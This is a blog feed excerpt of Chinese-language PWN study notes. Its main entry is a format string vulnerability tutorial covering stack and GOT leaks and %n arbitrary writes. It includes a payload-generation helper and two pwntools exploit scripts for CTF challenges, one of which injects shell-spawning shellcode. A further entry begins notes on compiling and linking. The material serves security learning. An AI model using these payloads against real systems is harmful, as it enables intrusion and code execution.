    <summary type="html">&lt;h1 id=&quot;0x01-Canary&quot;&gt;&lt;a href=&quot;#0x01-Canary&quot; class=&quot;headerlink&quot; title=&quot;0x01 Canary&quot;&gt;&lt;/a&gt;0x01 Canary&lt;/h1&gt;&lt;p&gt;Canary 的意思是金丝雀,是一种用于对抗栈溢出攻击的技术，也叫做</summary>
      
    
    
    
    
    <category term="读书笔记" scheme="https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="https://pz1o.top/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://pz1o.top/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-02-15T14:12:39.000Z</published>
    <updated>2021-02-22T13:53:43.792Z</updated>
    
    <content type="html"><![CDATA[<p>总结一下格式化字符串漏洞</p><h1 id="0x01-格式化输出函数"><a href="#0x01-格式化输出函数" class="headerlink" title="0x01 格式化输出函数"></a>0x01 格式化输出函数</h1><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int prinf(const char *format,...);</span><br><span class="line">int fprintf(FILE *stream, const char *format,...);</span><br><span class="line">int dprintf(int fd,const char *format,...);</span><br><span class="line">int sprintf(char *str,const char *format,...);</span><br><span class="line">int snprintf(char *str, size_t size, const char *format,...);</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td style="text-align:center">printf</td><td style="text-align:center">输出到stdout</td></tr><tr><td style="text-align:center">fprintf</td><td style="text-align:center">输出到指定FILE流</td></tr><tr><td style="text-align:center">vprintf</td><td style="text-align:center">根据参数列表格式化输出到 stdout</td></tr><tr><td style="text-align:center">vfprintf</td><td style="text-align:center">根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td style="text-align:center">sprintf</td><td style="text-align:center">输出到字符串</td></tr><tr><td style="text-align:center">snprintf</td><td style="text-align:center">输出指定字节数到字符串</td></tr><tr><td style="text-align:center">vsprintf</td><td style="text-align:center">根据参数列表格式化输出到字符串</td></tr><tr><td style="text-align:center">vsnprintf</td><td style="text-align:center">根据参数列表格式化输出指定字节到字符串</td></tr><tr><td style="text-align:center">setproctitle</td><td style="text-align:center">设置 argv</td></tr><tr><td style="text-align:center">syslog</td><td style="text-align:center">输出日志</td></tr><tr><td style="text-align:center">err, verr, warn, vwarn 等</td><td style="text-align:center">…</td></tr></tbody></table></div><p><strong>格式化字符串的基本格式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><ul><li>parameter<ul><li>n$，获取格式化字符串中的指定参数</li></ul></li><li>field width<ul><li>输出的最小宽度</li></ul></li><li>precision<ul><li>输出的最大长度</li></ul></li><li>length，输出的长度<ul><li>hh，输出一个字节</li><li>h，输出一个双字节</li></ul></li><li>type<ul><li>d/i，有符号整数</li><li>u，无符号整数</li><li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li><li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li><li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li><li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%， ‘%’字面值，不接受任何 flags, width。</li></ul></li></ul><p>举几个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%12c"</span>,<span class="string">'A'</span>);   <span class="comment">//"           A"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%12c%n"</span>,<span class="string">'A'</span>,&amp;n); <span class="comment">// n = 12;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%16s%n"</span>,<span class="string">"hello"</span>,&amp;n); <span class="comment">//n = 16</span></span><br><span class="line"><span class="comment">//           hello</span></span><br><span class="line"><span class="comment">//16</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%2$s %1$s"</span>,<span class="string">"Format"</span>,<span class="string">"Strings"</span>);  </span><br><span class="line"><span class="comment">//Strings Format</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%42c%1$n"</span>,&amp;n); </span><br><span class="line"><span class="comment">//                                         �</span></span><br><span class="line"><span class="number">42</span></span><br></pre></td></tr></table></figure><h1 id="0x02-格式化字符串漏洞"><a href="#0x02-格式化字符串漏洞" class="headerlink" title="0x02 格式化字符串漏洞"></a>0x02 格式化字符串漏洞</h1><h2 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1.基本原理"></a>1.基本原理</h2><p>先看一个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s %d %s %x %x %x %3$s&quot;,&quot;hello&quot;,123,&quot;x&quot;);</span><br><span class="line">&#x2F;&#x2F;hello 123 x f7fb43dc ffffcfc0 0 x</span><br></pre></td></tr></table></figure><blockquote><p>这里我们可以看到是有7个参数输出，但我们只有3个参数，原因是什么？</p></blockquote><p>可以gdb调试一下</p><p><img src="/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210216115800043.png" alt="image-20210216115800043"></p><p>我们可以看到输出的是图中红框的数</p><p>最后x就是偏移量为3的x</p><p>说明我们对内存已经进行了一定的泄露。</p><p>那么我们如果可以控制格式化字符串，我们就可以进行任意泄露，并通过%n来任意写。</p><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><p>格式化字符串主要有：</p><ol><li>栈数据泄露</li><li>任意地址内存泄露</li><li>栈数据覆盖</li><li>任意地址内存覆盖</li><li>程序崩溃</li></ol><p>首先需要说明一下，在32位和64位系统上传参的方式是有区别的:</p><ul><li><p>32位</p><ul><li>参数从右到左依次压入堆栈，每次压入一个。调用者（caller）必须明确有多少Byte的参数，以便函数返回后清理掉。</li></ul></li><li><p>64位</p><ul><li>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。</li><li>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</li></ul></li></ul><p>因为利用的需要，明确出格式化字符串本身在第几个参数是有必要的，在这里可以使用：</p><blockquote><p>AAAA%n$x</p></blockquote><p>意思是以16位打印第n+1个参数的内容，如果n的数值正确应该返回<code>41414141</code>,0x41正是’A’的ASCII值，如果出现了就可以确认。</p><h3 id="2-1-程序崩溃"><a href="#2-1-程序崩溃" class="headerlink" title="2.1 程序崩溃"></a>2.1 程序崩溃</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s%s%s%s%s%s%s%s&quot;)</span><br></pre></td></tr></table></figure><p>上面这种字符串格式会引起崩溃</p><p>原因有3点</p><ol><li>对于每一个<code>%s</code>printf都需要从栈上获取数字，并将其作为地址，打印指向地址的内存，直到出现空字符</li><li>某个数字不是地址</li><li>获取某个数字是地址，但该地址受保护</li></ol><h3 id="2-2-栈数据泄露"><a href="#2-2-栈数据泄露" class="headerlink" title="2.2 栈数据泄露"></a>2.2 栈数据泄露</h3><h4 id="栈变量的值"><a href="#栈变量的值" class="headerlink" title="栈变量的值"></a><strong>栈变量的值</strong></h4><p>因为该家族函数执行环境都在栈上，所以泄露栈上数据是很自然的。除了首先想到的通过类似于<code>%p%p%p%p...</code>这样打印的方法，还有用<code>%n$[format]</code>这样指定栈上第几个参数的方式。</p><h4 id="栈上的字符串"><a href="#栈上的字符串" class="headerlink" title="栈上的字符串"></a><strong>栈上的字符串</strong></h4><p>%n$s来泄露字符串</p><p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃</strong></p><blockquote><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容</li></ol></blockquote><h3 id="2-3-任意地址内存泄露"><a href="#2-3-任意地址内存泄露" class="headerlink" title="2.3 任意地址内存泄露"></a>2.3 任意地址内存泄露</h3><p>我们用这个主要是通过泄露GOT表，从而获得libc基址，达到getshell</p><p>先看一下这个程序</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  // strtoull</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">128</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(a);</span><br><span class="line">&#125;</span><br><span class="line">AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line"><span class="comment">//AAAA.0xffffcf2c.0xf7fd34a0.0x1.(nil).0x1.0xf7ffd918.0x41414141.0x2e70252e.0x252e7025</span></span><br></pre></td></tr></table></figure><p>看一下调试记录</p><p><img src="/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210216172241585.png" alt="image-20210216172241585"></p><blockquote><p>为什么出现这种情况？</p><p>因为我们的a是可控的，所以在栈上一定有a的地址，也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。</p><p>我们所要做的就是找出a的地址</p><p>也就是相对偏移量</p></blockquote><p>利用下面这种格式，我们就可以得到对应地址的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><p>这里演示一下泄露got表，先看一下重定向表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ readelf -r b</span><br><span class="line"></span><br><span class="line">重定位节 &#39;.rel.dyn&#39; 位于偏移量 0x30c 含有 1 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">重定位节 &#39;.rel.plt&#39; 位于偏移量 0x314 含有 4 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><blockquote><p>由于一些不可见字符的原因，在写地址写入时会被省略</p></blockquote><p>这里用scanf</p><p>建议写脚本运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39;\x18\xa0\x04\x08.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#39;</span><br><span class="line">output：</span><br><span class="line">&#39;\x18\xa0\x04\x08.0xffa9156c.0xf7f314a0.0x1.(nil).0x1.0xf7f5b918.0x804a018.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025&#39;</span><br><span class="line"></span><br><span class="line">p32(0x0804a018) + &quot;%7$s&quot;</span><br><span class="line">output：</span><br><span class="line">&#39;\x18\xa0\x04\x08\xd0\xb0\xe5\xf7&#39;</span><br></pre></td></tr></table></figure><p>我们也就泄露出了got表地址</p><blockquote><p>我们不能直接在命令行输入 \ x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 \,x,0,c 分别作为一个字符进行读入。</p></blockquote><h3 id="2-4-栈数据覆盖"><a href="#2-4-栈数据覆盖" class="headerlink" title="2.4 栈数据覆盖"></a>2.4 栈数据覆盖</h3><p>%n转换指示符<strong>将当前已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量</strong></p><p>我们需要以下几个步骤</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[overwrite addr]....%[overwrite offset]$n</span><br><span class="line"></span><br><span class="line">eg：</span><br><span class="line">p32(xx)+&quot;%012d%7$n&quot;</span><br><span class="line">向xx地址指向地址中写入16</span><br><span class="line">%012d  </span><br><span class="line">%08x</span><br></pre></td></tr></table></figure><h3 id="2-5-任意地址内存覆盖"><a href="#2-5-任意地址内存覆盖" class="headerlink" title="2.5 任意地址内存覆盖"></a>2.5 任意地址内存覆盖</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>根据上面的原理，其实我们直到想在哪里放地址都是可以的</p><p>主要是找到对应的偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">AA%15$nA+p32(xx)</span><br></pre></td></tr></table></figure><h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即<strong>最低有效位存储在低地址</strong>。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x88888888 0x88888888</span><br><span class="line">printf(&quot;%hhn&quot;)  &#x2F;&#x2F;写入单字节0x888888880x88888801</span><br><span class="line">printf(&quot;%hn&quot;)&#x2F;&#x2F;写入双字节0x888888880x88880001</span><br><span class="line">printf(&quot;%n&quot;)&#x2F;&#x2F;写入4字节0x888888880x00000001</span><br><span class="line">printf(&quot;%ln&quot;)&#x2F;&#x2F;写入8字节0x00000000 0x00000001</span><br><span class="line">printf(&quot;%lln&quot;)&#x2F;&#x2F;写入16字节0x00000000 0x00000000 0x00000000 0x00000001</span><br></pre></td></tr></table></figure><p>所以我们可以给对应的地址写入单字节，来获得大数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">&#x2F;&#x2F;偏移量为6</span><br><span class="line">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#39;%6$n&#39;+pad2+&#39;%7$n&#39;+pad3+&#39;%8$n&#39;+pad4+&#39;%9$n&#39;</span><br></pre></td></tr></table></figure><p>这是wiki上的脚本,我们来看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(prev, word, index)</span>:</span> <span class="comment">#prev 之前有多少字母 word 还需要多少 index  偏移</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    fmtstr += <span class="string">"%"</span> + str(index) + <span class="string">"$hhn"</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span><span class="params">(offset, size, addr, target)</span>:</span><span class="comment">#初始偏移量 字节 目标地址 目标值</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = len(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><blockquote><ul><li>offset 表示要覆盖的地址最初的偏移</li><li>size 表示机器字长</li><li>addr 表示将要覆盖的地址。</li><li>target 表示我们要覆盖为的目的变量值</li></ul></blockquote><h1 id="0x03-格式化字符串例题"><a href="#0x03-格式化字符串例题" class="headerlink" title="0x03 格式化字符串例题"></a>0x03 格式化字符串例题</h1><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>虽然说只是新手区，但还是记录一下这道题目</p><p>这道题主要是如何调取shell</p><p>在没有system和/bin/sh，就应该想到用shellcode</p><p>那么shellcode应该往哪里写，又从哪里调用呢</p><p>nx开了，栈上也就不可写了，bss段上也没有什么东西</p><p>那我们往哪里写呢</p><p><img src="/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20201223212813215.png" alt="image-20201223212813215"></p><p>看这里，我们可以在这里写入shellcode</p><p>还有这个题还有一个问题就是利用pwntools生成shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>不同机器汇编代码不同</p><p>贴exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"220.249.52.134"</span>,<span class="number">31872</span>)<span class="comment">#220.249.52.134:31872</span></span><br><span class="line"><span class="comment">#p = process("./string")</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">v4 = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"What should your character's name be:"</span>, <span class="string">'pz1o'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>, <span class="string">'east'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"'Give me an address'"</span>, str(int(v4)))</span><br><span class="line">p.sendlineafter(<span class="string">"And, you wish is:"</span>, <span class="string">'%85c%7$n'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendlineafter(<span class="string">"USE YOU SPELL"</span>, shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>格式化字符串：</p><p>%85c%7$n</p><p>把85写入偏移量为7的地方</p></blockquote><h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>格式化字符串漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>%n</code>，如<code>printf(&quot;abcdefg%n&quot;);</code>,%n前面写了7个字符，所以向ESP（栈顶指针）所指向的地址处所指向的地址处（ESP指向了栈顶，此处存储着一个地址）写入7。</li><li><code>%10$n</code>，与<code>%n</code>类似，不过是向[ESP + 10]处指向的内存处写入7。</li></ul></blockquote><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.134"</span>,<span class="number">47890</span>)</span><br><span class="line">r.recvuntil(<span class="string">"please tell me your name:"</span>)</span><br><span class="line">r.sendline(b<span class="number">'111'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"leave your message please:"</span>)</span><br><span class="line">payload = p32(<span class="number">0x804a068</span>)+b<span class="number">'</span>aaaa%<span class="number">10</span>$n<span class="number">'</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;总结一下格式化字符串漏洞&lt;/p&gt;
&lt;h1 id=&quot;0x01-格式化输出函数&quot;&gt;&lt;a href=&quot;#0x01-格式化输出函数&quot; class=&quot;headerlink&quot; title=&quot;0x01 格式化输出函数&quot;&gt;&lt;/a&gt;0x01 格式化输出函数&lt;/h1&gt;&lt;p&gt;格式化字符串函数可以</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU(PWN2)---堆</title>
    <link href="https://pz1o.top/2021/02/15/BUU-PWN3-%E5%A0%86/"/>
    <id>https://pz1o.top/2021/02/15/BUU-PWN3-%E5%A0%86/</id>
    <published>2021-02-15T07:32:42.000Z</published>
    <updated>2021-02-15T07:35:19.719Z</updated>
    
    
    
    
    
    <category term="刷题" scheme="https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>程序员的自我修养</title>
    <link href="https://pz1o.top/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
    <id>https://pz1o.top/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</id>
    <published>2021-02-14T08:54:16.000Z</published>
    <updated>2021-02-14T08:56:57.211Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-编译和链接"><a href="#0x01-编译和链接" class="headerlink" title="0x01 编译和链接"></a>0x01 编译和链接</h1><h2 id="1-被隐藏了的过程"><a href="#1-被隐藏了的过程" class="headerlink" title="1.被隐藏了的过程"></a>1.被隐藏了的过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc a.c</span><br></pre></td></tr></table></figure><blockquote><p>有四个过程</p><p>预处理—&gt;编译—&gt;汇编—&gt;链接</p></blockquote><h3 id="1-1-预编译"><a href="#1-1-预编译" class="headerlink" title="1.1 预编译"></a>1.1 预编译</h3><p>预编译主要来处理那些源代码文件中的以”#”开头的预编译指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -E a.c -o a.i</span><br><span class="line">cpp a.c &gt; a.i</span><br></pre></td></tr></table></figure><h3 id="1-2-编译"><a href="#1-2-编译" class="headerlink" title="1.2 编译"></a>1.2 编译</h3><p>编译就是把预处理完的文件转化成相应的汇编代码文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S a.i -o a.s</span><br></pre></td></tr></table></figure><blockquote><p>c编译器使用cc1</p><p>c++是cc1plus</p></blockquote><h3 id="1-3-汇编"><a href="#1-3-汇编" class="headerlink" title="1.3 汇编"></a>1.3 汇编</h3><p>汇编器是将汇编代码转变成机器可执行的指令</p><p>简单来说就是翻译，将汇编代码与机器指令一一对照翻译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">as a.s -o a.o</span><br><span class="line">gcc -c a.s -o a.o</span><br></pre></td></tr></table></figure><blockquote><p>汇编器是as</p></blockquote><p>从源文件开始，预编译，编译，汇编输出的文件叫做目标文件。</p><h3 id="1-4-链接"><a href="#1-4-链接" class="headerlink" title="1.4 链接"></a>1.4 链接</h3><p>链接可以说是最难以理解的一个过程</p><p>接下来会说</p><h2 id="2-编译器在做什么"><a href="#2-编译器在做什么" class="headerlink" 